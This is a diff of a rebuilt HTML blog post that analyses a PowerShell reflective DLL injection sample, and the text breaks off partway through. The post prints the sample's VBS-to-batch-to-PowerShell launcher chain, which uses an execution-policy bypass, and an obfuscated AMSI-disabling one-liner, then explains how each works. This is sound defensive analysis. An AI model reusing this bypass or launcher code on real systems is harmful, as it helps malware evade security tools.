@@ -1,10 +1,10 @@
 <!DOCTYPE html>
 <html lang="en-us">
-    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    <head>
         <meta charset="utf-8">
         <meta name="viewport" content="width=device-width, initial-scale=1">
         <meta name="robots" content="noodp" />
-        <title>Deep Analysis of a Powershell-Based Reflective DLL Injection Sample, Part 1 - misthi0s.dev</title><meta name="Description" content="This is my cool site"><meta property="og:url" content="http://localhost:1313/posts/2024-05-12-powershell-reflective-dll-injection-sample-1/">
+        <title>Deep Analysis of a Powershell-Based Reflective DLL Injection Sample, Part 1 - misthi0s.dev</title><meta name="Description" content="This is my cool site"><meta property="og:url" content="https://misthi0s.github.io/posts/2024-05-12-powershell-reflective-dll-injection-sample-1/">
   <meta property="og:site_name" content="misthi0s.dev">
   <meta property="og:title" content="Deep Analysis of a Powershell-Based Reflective DLL Injection Sample, Part 1">
   <meta property="og:description" content="Reflective DLL injection is a common technique used by malware that allows an attacker to inject a DLL into a running process without first having to write that DLL to disk. Keeping the DLL binary in memory as opposed to writing to disk provides a few different advantages, particularly in the case of security tools. Files written to disk are commonly scanned by anti-malware tools on creation as well as loading, making malicious DLLs more likely to be discovered and quarantined if created on the system. Keeping the DLL completely within memory during each point of the infection makes it less likely that any security products on the target will discover and stop it. Likewise, by keeping the DLL within memory and never writing it to disk, it can make it harder for incident responders or malware analysts to determine what the DLL’s purpose is. This second point, however, is still possible if one knows how to extract it from memory or from the originating location where the DLL’s contents are stored.">
@@ -27,9 +27,9 @@
 <meta name="application-name" content="My cool site">
 <meta name="apple-mobile-web-app-title" content="My cool site"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
         <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
-        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="http://localhost:1313/posts/2024-05-12-powershell-reflective-dll-injection-sample-1/" /><link rel="prev" href="http://localhost:1313/posts/2023-03-08-hunting-impacket-rce-tools/" /><link rel="next" href="http://localhost:1313/posts/2024-12-01-alternate-execution-methods-encoding-in-memory-powershell/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
-        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/css/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
-        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://misthi0s.github.io/posts/2024-05-12-powershell-reflective-dll-injection-sample-1/" /><link rel="prev" href="https://misthi0s.github.io/posts/2023-03-08-hunting-impacket-rce-tools/" /><link rel="next" href="https://misthi0s.github.io/posts/2024-12-01-alternate-execution-methods-encoding-in-memory-powershell/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css"></noscript><link rel="preload" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css"></noscript><script type="application/ld+json">
     {
         "@context": "http://schema.org",
         "@type": "BlogPosting",
@@ -37,9 +37,9 @@
         "inLanguage": "en-us",
         "mainEntityOfPage": {
             "@type": "WebPage",
-            "@id": "http:\/\/localhost:1313\/posts\/2024-05-12-powershell-reflective-dll-injection-sample-1\/"
-        },"genre": "posts","keywords": "malware, .net, powershell, AsyncRAT, dll, reflection","wordcount":  2741 ,
-        "url": "http:\/\/localhost:1313\/posts\/2024-05-12-powershell-reflective-dll-injection-sample-1\/","datePublished": "2024-05-12T12:42:00+00:00","dateModified": "2024-05-12T12:42:00+00:00","publisher": {
+            "@id": "https:\/\/misthi0s.github.io\/posts\/2024-05-12-powershell-reflective-dll-injection-sample-1\/"
+        },"genre": "posts","keywords": "malware, .net, powershell, AsyncRAT, dll, reflection","wordcount":  2767 ,
+        "url": "https:\/\/misthi0s.github.io\/posts\/2024-05-12-powershell-reflective-dll-injection-sample-1\/","datePublished": "2024-05-12T12:42:00+00:00","dateModified": "2024-05-12T12:42:00+00:00","publisher": {
             "@type": "Organization",
             "name": ""},"author": {
                 "@type": "Person",
@@ -47,7 +47,7 @@
             },"description": ""
     }
     </script></head>
-    <body data-header-desktop="fixed" data-header-mobile="auto"><script>(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
 
         <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
     <div class="header-wrapper">
@@ -70,28 +70,24 @@
                 <span></span><span></span><span></span>
             </div>
         </div>
-        <div class="menu" id="menu-mobile"><a class="menu-item" href="/posts/">Blog</a><a class="menu-item" href="/categories/">Categories</a><a class="menu-item" href="/tags/">Tags</a><a class="menu-item" href="/projects/">Projects</a><a class="menu-item" href="/about/">About</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
-                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>Switch Theme</a></div>
+        <div class="menu" id="menu-mobile"><a class="menu-item" href="/posts/" title="">Blog</a><a class="menu-item" href="/categories/" title="">Categories</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/projects/" title="">Projects</a><a class="menu-item" href="/about/" title="">About</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
     </div>
 </header><main class="main">
                 <div class="container"><div class="toc" id="toc-auto">
             <h2 class="toc-title">Contents</h2>
             <div class="toc-content" id="toc-content-auto"></div>
-        </div><article class="page single"><div class="single-card"><h1 class="single-title animate__animated animate__flipInX">Deep Analysis of a Powershell-Based Reflective DLL Injection Sample, Part 1</h1><div class="post-meta">
-                <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel="author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>misthi0s</a></span><span class="post-category">included in <a href="/categories/malware/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Malware</a></span></div>
-                <div class="post-meta-line"><span class="post-publish">
-                            <i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i><time datetime="2024-05-12">2024-05-12</time>
-                        </span><span class="post-word-count">
-                            <i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>2741 words
-                        </span><span class="post-reading-time">
-                            <i class="far fa-clock fa-fw" aria-hidden="true"></i>13 minutes
-                        </span></div>
-            </div><div class="details toc" id="toc-static"  data-kept="">
-                    <div class="details-summary toc-title">
-                        <span>Contents</span>
-                        <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
-                    </div>
-                    <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Deep Analysis of a Powershell-Based Reflective DLL Injection Sample, Part 1</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel="author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>misthi0s</a></span>&nbsp;<span class="post-category">included in <a href="/categories/malware/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Malware</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2024-05-12">2024-05-12</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;2767 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;13 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
   <ul>
     <li><a href="#first-section---visual-basic">First Section - Visual Basic</a></li>
     <li><a href="#second-section---powershell">Second Section - PowerShell</a></li>
@@ -112,166 +108,205 @@
     <li><a href="#end-of-part-1">End of Part 1</a></li>
   </ul>
 </nav></div>
-                </div><div class="content" id="content"><p>Reflective DLL injection is a common technique used by malware that allows an attacker to inject a DLL into a running process without first having to write that DLL to disk. Keeping the DLL binary in memory as opposed to writing to disk provides a few different advantages, particularly in the case of security tools. Files written to disk are commonly scanned by anti-malware tools on creation as well as loading, making malicious DLLs more likely to be discovered and quarantined if created on the system. Keeping the DLL completely within memory during each point of the infection makes it less likely that any security products on the target will discover and stop it. Likewise, by keeping the DLL within memory and never writing it to disk, it can make it harder for incident responders or malware analysts to determine what the DLL&rsquo;s purpose is. This second point, however, is still possible if one knows how to extract it from memory or from the originating location where the DLL&rsquo;s contents are stored.</p>
-<p>In this post, we will take a deep dive into a sample that uses this technique to execute a commonly used C2 framework implant (no spoilers!) on the system. The sample in question starts with a PowerShell script and uses built-in .NET methods within PowerShell to perform the DLL injection. For anyone who wants to follow along, the sample in question can be found on MalwareBazaar <a href="https://bazaar.abuse.ch/sample/1d8263d5990e55619974f81ed1dd441def3f761fcecb160f056a459b74e635c6/" target="_blank" rel="noopener noreferrer ">here</a>. With that, let&rsquo;s dive in!</p>
+            </div><div class="content" id="content"><p>Reflective DLL injection is a common technique used by malware that allows an attacker to inject a DLL into a running process without first having to write that DLL to disk. Keeping the DLL binary in memory as opposed to writing to disk provides a few different advantages, particularly in the case of security tools. Files written to disk are commonly scanned by anti-malware tools on creation as well as loading, making malicious DLLs more likely to be discovered and quarantined if created on the system. Keeping the DLL completely within memory during each point of the infection makes it less likely that any security products on the target will discover and stop it. Likewise, by keeping the DLL within memory and never writing it to disk, it can make it harder for incident responders or malware analysts to determine what the DLL&rsquo;s purpose is. This second point, however, is still possible if one knows how to extract it from memory or from the originating location where the DLL&rsquo;s contents are stored.</p>
+<p>In this post, we will take a deep dive into a sample that uses this technique to execute a commonly used C2 framework implant (no spoilers!) on the system. The sample in question starts with a PowerShell script and uses built-in .NET methods within PowerShell to perform the DLL injection. For anyone who wants to follow along, the sample in question can be found on MalwareBazaar <a href="https://bazaar.abuse.ch/sample/1d8263d5990e55619974f81ed1dd441def3f761fcecb160f056a459b74e635c6/" target="_blank" rel="noopener noreffer ">here</a>. With that, let&rsquo;s dive in!</p>
 <h2 id="first-section---visual-basic">First Section - Visual Basic</h2>
 <p>For brevity&rsquo;s sake, we will skip over the numerous &ldquo;Start-Sleep&rdquo; commands configured within this script to space out each action that the script takes and focus more on the juicy commands that are being run. This script is rather interesting as its main focus is to write various other commands into different files to be executed at a later time. The first set of content is writes into a newly created file is as follows:</p>
-<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
-    <div class="code-header language-">
-        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
-        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
-        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
-    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$Content = @&#39;
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$Content = @&#39;
 </span></span><span class="line"><span class="cl">on error resume next
 </span></span><span class="line"><span class="cl">Set clay = CreateObject(Replace(&#34;W!S!c!r!i!p!t!.!S!h!e!l!l&#34;,&#34;!&#34;,&#34;&#34;))
 </span></span><span class="line"><span class="cl">clay.Run chr(34) &amp; &#34;C:\Users\Public\svchost.bat&#34; &amp; Chr(34), 0
 </span></span><span class="line"><span class="cl">&#39;@
-</span></span><span class="line"><span class="cl">Set-Content -Path C:\Users\Public\svchost.vbs -Value $Content</span></span></code></pre></div></div>
-<p>The first thing to note in this block is that the content within the <code>$Content</code> variable is not PowerShell, but is instead Visual Basic. This means that this particular sample appears to be jumping between different programming languages, which can be common for malware that wants to execute contents under various processes to try to hide its execution or confuse those looking at the process chain.</p>
+</span></span><span class="line"><span class="cl">Set-Content -Path C:\Users\Public\svchost.vbs -Value $Content
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>The first thing to note in this block is that the content within the <code>$Content</code> variable is not PowerShell, but is instead Visual Basic. This means that this particular sample appears to be jumping between different programming languages, which can be common for malware that wants to execute contents under various processes to try to hide its execution or confuse those looking at the process chain.</p>
 <p>There is some basic &ldquo;find and replace&rdquo; obfuscation going on here, but looking at the contents, we can rather easily see that it is spelling out <code>WScript.Shell</code>. On the next line after this, we can see that it is running <code>WScript.Shell.Run</code> against a path that contains <code>C:\Users\Public\svchost.bat</code>. Using <code>chr</code> is another common obfuscation technique, telling the interpreter to include the character value of decimal <code>34</code> in this location and concatenating it to the previous mentioned string. In this case, character <code>34</code> refers to the double quote (&quot;) character. All in all, the full deobfuscated line that makes up the contents of this <code>$Content</code> variable is the following:</p>
 <p><code>WScript.Shell.Run &quot;C:\Users\Public\svchost.bat&quot;,0</code></p>
 <p>This, effectively, is telling the Visual Basic interpreter to execute the <code>C:\Users\Public\svchost.bat</code> file, with the <code>,0</code> meaning that it should do this within a new window.</p>
 <p>With the contents of the <code>$Content</code> variable out of the way, the PowerShell script then uses <code>Set-Content</code> to write this variable into a file called <code>C:\Users\Public\svchost.vbs</code>. This means that, when this VBS file is executed, it will simply run the <code>WScript.Shell.Run</code> command mentioned above.</p>
 <h2 id="second-section---powershell">Second Section - PowerShell</h2>
 <p>The next block of code looks similar to the first; it contains a <code>$Content</code> variable containing code, followed by a <code>Set-Content</code> to write the contents of the variable to a file. This block can be seen below:</p>
-<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
-    <div class="code-header language-">
-        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
-        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
-        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
-    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$Content = @&#39;
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$Content = @&#39;
 </span></span><span class="line"><span class="cl">PowerShell -NoProfile -ExecutionPolicy Bypass -Command C:\Users\Public\svchost.ps1
 </span></span><span class="line"><span class="cl">&#39;@
-</span></span><span class="line"><span class="cl">Set-Content -Path C:\Users\Public\svchost.bat -Value $Content</span></span></code></pre></div></div>
-<p>This block is quite a bit less complicated than the first. The <code>$Content</code> variable here is set up to simply launch a new PowerShell process and execute a script at <code>C:\Users\Public\svchost.ps1</code>. We haven&rsquo;t seen yet what is contained within this file, but it&rsquo;s going to likely be written further down in the main script.</p>
+</span></span><span class="line"><span class="cl">Set-Content -Path C:\Users\Public\svchost.bat -Value $Content
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>This block is quite a bit less complicated than the first. The <code>$Content</code> variable here is set up to simply launch a new PowerShell process and execute a script at <code>C:\Users\Public\svchost.ps1</code>. We haven&rsquo;t seen yet what is contained within this file, but it&rsquo;s going to likely be written further down in the main script.</p>
 <p>Regardless, this content is written to the file <code>C:\Users\Public\svchost.bat</code>, which is the name of the file written to in the first block of code. As of right now, this means that when <code>svchost.vbs</code> is executed, it will in turn execute <code>svchost.bat</code>, which will then in turn execute <code>svchost.ps1</code>. Initial observations of this script so far shows us that it uses a rather convuluted process of executing different scripts that don&rsquo;t really do anything other than execute further scripts. This chain of scripts is likely meant to throw off security tools and analysts and create a more confusing process chain than simply executing from a script directly to the main payload.</p>
 <h2 id="third-section---security-bypass">Third Section - Security Bypass</h2>
 <p>The next <code>$Content</code> block is where the script gets really interesting. There are four different things going on in this variable, and we&rsquo;ll go through them one by one.</p>
 <p>The first part of the code block is heavily obfuscated, as can be seen below:</p>
-<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
-    <div class="code-header language-">
-        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
-        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
-        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
-    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="n">S</span><span class="o">`</span><span class="n">eT</span><span class="o">-</span><span class="n">It</span><span class="o">`</span><span class="nf">em</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="s1">&#39;V&#39;</span><span class="o">+</span><span class="s1">&#39;aR&#39;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">&#39;IA&#39;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="p">(</span><span class="s1">&#39;blE:1&#39;</span><span class="o">+</span><span class="s1">&#39;q2&#39;</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="p">(</span><span class="s1">&#39;uZ&#39;</span><span class="o">+</span><span class="s1">&#39;x&#39;</span><span class="p">)</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="p">([</span><span class="n">TYpE</span><span class="p">](</span><span class="w"> </span><span class="s2">&#34;{1}{0}&#34;</span><span class="o">-</span><span class="n">F</span><span class="s1">&#39;F&#39;</span><span class="p">,</span><span class="s1">&#39;rE&#39;</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="p">;</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="n">Get</span><span class="o">-</span><span class="n">varI</span><span class="o">`</span><span class="n">A</span><span class="o">`</span><span class="nf">BLE</span><span class="w"> </span><span class="p">((</span><span class="s1">&#39;1Q&#39;</span><span class="o">+</span><span class="s1">&#39;2U&#39;</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="s1">&#39;zX&#39;</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="o">-</span><span class="n">VaL</span><span class="w"> </span><span class="p">).</span><span class="s2">&#34;A`ss`Embly&#34;</span><span class="p">.</span><span class="s2">&#34;GET`TY`Pe&#34;</span><span class="p">((</span><span class="s2">&#34;{6}{3}{1}{4}{2}{0}{5}&#34;</span><span class="w"> </span><span class="o">-</span><span class="nf">f</span><span class="p">(</span><span class="s1">&#39;Uti&#39;</span><span class="o">+</span><span class="s1">&#39;l&#39;</span><span class="p">),</span><span class="s1">&#39;A&#39;</span><span class="p">,(</span><span class="s1">&#39;Am&#39;</span><span class="o">+</span><span class="s1">&#39;si&#39;</span><span class="p">),(</span><span class="s1">&#39;.Man&#39;</span><span class="o">+</span><span class="s1">&#39;age&#39;</span><span class="o">+</span><span class="s1">&#39;men&#39;</span><span class="o">+</span><span class="s1">&#39;t.&#39;</span><span class="p">),(</span><span class="s1">&#39;u&#39;</span><span class="o">+</span><span class="s1">&#39;to&#39;</span><span class="o">+</span><span class="s1">&#39;mation.&#39;</span><span class="p">),</span><span class="s1">&#39;s&#39;</span><span class="p">,(</span><span class="s1">&#39;Syst&#39;</span><span class="o">+</span><span class="s1">&#39;em&#39;</span><span class="p">)</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="p">).</span><span class="s2">&#34;g`etf`iElD&#34;</span><span class="p">(</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="s2">&#34;{0}{2}{1}&#34;</span><span class="w"> </span><span class="o">-</span><span class="nf">f</span><span class="p">(</span><span class="s1">&#39;a&#39;</span><span class="o">+</span><span class="s1">&#39;msi&#39;</span><span class="p">),</span><span class="s1">&#39;d&#39;</span><span class="p">,(</span><span class="s1">&#39;I&#39;</span><span class="o">+</span><span class="s1">&#39;nitF&#39;</span><span class="o">+</span><span class="s1">&#39;aile&#39;</span><span class="p">)</span><span class="w"> </span><span class="p">),(</span><span class="w"> </span><span class="s2">&#34;{2}{4}{0}{1}{3}&#34;</span><span class="w"> </span><span class="o">-</span><span class="nf">f</span><span class="w"> </span><span class="p">(</span><span class="s1">&#39;S&#39;</span><span class="o">+</span><span class="s1">&#39;tat&#39;</span><span class="p">),</span><span class="s1">&#39;i&#39;</span><span class="p">,(</span><span class="s1">&#39;Non&#39;</span><span class="o">+</span><span class="s1">&#39;Publ&#39;</span><span class="o">+</span><span class="s1">&#39;i&#39;</span><span class="p">),</span><span class="s1">&#39;c&#39;</span><span class="p">,</span><span class="s1">&#39;c,&#39;</span><span class="w"> </span><span class="p">)).</span><span class="s2">&#34;sE`T`VaLUE&#34;</span><span class="p">(</span><span class="w"> </span><span class="err">${</span><span class="n">n</span><span class="o">`</span><span class="n">ULl</span><span class="err">}</span><span class="p">,</span><span class="err">${</span><span class="n">t</span><span class="o">`</span><span class="n">RuE</span><span class="err">}</span><span class="w"> </span><span class="p">)</span></span></span></code></pre></div></div>
-<p>Let&rsquo;s go through this step-by-step.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="n">S</span><span class="o">`</span><span class="n">eT</span><span class="o">-</span><span class="n">It</span><span class="o">`</span><span class="nf">em</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="s1">&#39;V&#39;</span><span class="o">+</span><span class="s1">&#39;aR&#39;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">&#39;IA&#39;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="p">(</span><span class="s1">&#39;blE:1&#39;</span><span class="o">+</span><span class="s1">&#39;q2&#39;</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="p">(</span><span class="s1">&#39;uZ&#39;</span><span class="o">+</span><span class="s1">&#39;x&#39;</span><span class="p">)</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="p">([</span><span class="n">TYpE</span><span class="p">](</span><span class="w"> </span><span class="s2">&#34;{1}{0}&#34;</span><span class="o">-</span><span class="n">F</span><span class="s1">&#39;F&#39;</span><span class="p">,</span><span class="s1">&#39;rE&#39;</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="p">;</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="n">Get</span><span class="o">-</span><span class="n">varI</span><span class="o">`</span><span class="n">A</span><span class="o">`</span><span class="nf">BLE</span><span class="w"> </span><span class="p">((</span><span class="s1">&#39;1Q&#39;</span><span class="o">+</span><span class="s1">&#39;2U&#39;</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="s1">&#39;zX&#39;</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="o">-</span><span class="n">VaL</span><span class="w"> </span><span class="p">).</span><span class="s2">&#34;A`ss`Embly&#34;</span><span class="p">.</span><span class="s2">&#34;GET`TY`Pe&#34;</span><span class="p">((</span><span class="s2">&#34;{6}{3}{1}{4}{2}{0}{5}&#34;</span><span class="w"> </span><span class="o">-</span><span class="nf">f</span><span class="p">(</span><span class="s1">&#39;Uti&#39;</span><span class="o">+</span><span class="s1">&#39;l&#39;</span><span class="p">),</span><span class="s1">&#39;A&#39;</span><span class="p">,(</span><span class="s1">&#39;Am&#39;</span><span class="o">+</span><span class="s1">&#39;si&#39;</span><span class="p">),(</span><span class="s1">&#39;.Man&#39;</span><span class="o">+</span><span class="s1">&#39;age&#39;</span><span class="o">+</span><span class="s1">&#39;men&#39;</span><span class="o">+</span><span class="s1">&#39;t.&#39;</span><span class="p">),(</span><span class="s1">&#39;u&#39;</span><span class="o">+</span><span class="s1">&#39;to&#39;</span><span class="o">+</span><span class="s1">&#39;mation.&#39;</span><span class="p">),</span><span class="s1">&#39;s&#39;</span><span class="p">,(</span><span class="s1">&#39;Syst&#39;</span><span class="o">+</span><span class="s1">&#39;em&#39;</span><span class="p">)</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="p">).</span><span class="s2">&#34;g`etf`iElD&#34;</span><span class="p">(</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="s2">&#34;{0}{2}{1}&#34;</span><span class="w"> </span><span class="o">-</span><span class="nf">f</span><span class="p">(</span><span class="s1">&#39;a&#39;</span><span class="o">+</span><span class="s1">&#39;msi&#39;</span><span class="p">),</span><span class="s1">&#39;d&#39;</span><span class="p">,(</span><span class="s1">&#39;I&#39;</span><span class="o">+</span><span class="s1">&#39;nitF&#39;</span><span class="o">+</span><span class="s1">&#39;aile&#39;</span><span class="p">)</span><span class="w"> </span><span class="p">),(</span><span class="w"> </span><span class="s2">&#34;{2}{4}{0}{1}{3}&#34;</span><span class="w"> </span><span class="o">-</span><span class="nf">f</span><span class="w"> </span><span class="p">(</span><span class="s1">&#39;S&#39;</span><span class="o">+</span><span class="s1">&#39;tat&#39;</span><span class="p">),</span><span class="s1">&#39;i&#39;</span><span class="p">,(</span><span class="s1">&#39;Non&#39;</span><span class="o">+</span><span class="s1">&#39;Publ&#39;</span><span class="o">+</span><span class="s1">&#39;i&#39;</span><span class="p">),</span><span class="s1">&#39;c&#39;</span><span class="p">,</span><span class="s1">&#39;c,&#39;</span><span class="w"> </span><span class="p">)).</span><span class="s2">&#34;sE`T`VaLUE&#34;</span><span class="p">(</span><span class="w"> </span><span class="err">${</span><span class="n">n</span><span class="o">`</span><span class="n">ULl</span><span class="err">}</span><span class="p">,</span><span class="err">${</span><span class="n">t</span><span class="o">`</span><span class="n">RuE</span><span class="err">}</span><span class="w"> </span><span class="p">)</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>Let&rsquo;s go through this step-by-step.</p>
 <h3 id="third-section---step-1---variable-declaration">Third Section - Step 1 - Variable Declaration</h3>
 <p>The first set of code in this block is as follows:</p>
-<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
-    <div class="code-header language-">
-        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
-        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
-        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
-    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">S`eT-It`em ( &#39;V&#39;+&#39;aR&#39; + &#39;IA&#39; + (&#39;blE:1&#39;+&#39;q2&#39;) + (&#39;uZ&#39;+&#39;x&#39;) ) ([TYpE]( &#34;{1}{0}&#34;-F&#39;F&#39;,&#39;rE&#39; ) ) ;</span></span></code></pre></div></div>
-<p>This may look weird, but it&rsquo;s rather simplistic in its obfuscation. First, it uses backtick marks (`) between letters; these backticks are ignored by the interpreter when executed, which effectively means that <code>S`eT-It`em</code> simply means <code>Set-Item</code>. The rest of the first part of this string is simply character concatenation, which resolves to <code>Variable:1q2uZx</code>. Finally, the third type of obfuscation used in this block is basic string formatting. This simply means that the string is put together based on an array of values. In this case, we have <code>{1}{0}</code>, which means that the second item in the array ({1}) is immediately followed by the first item in the array ({0}). The array starts after the <code>-F</code> flag, meaning <code>F</code> is the first item and <code>rE</code> is the second item. This, in turns, will format together into <code>[TYpE]reF</code>. This is a special type of variable that is known as a <code>reference type</code>; that is, rather than it being a variable holding a value, it is a variable holding a reference. The <code>[ref]</code> variable is a special pointer to the class <code>System.Management.Automation.PSReference</code>.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
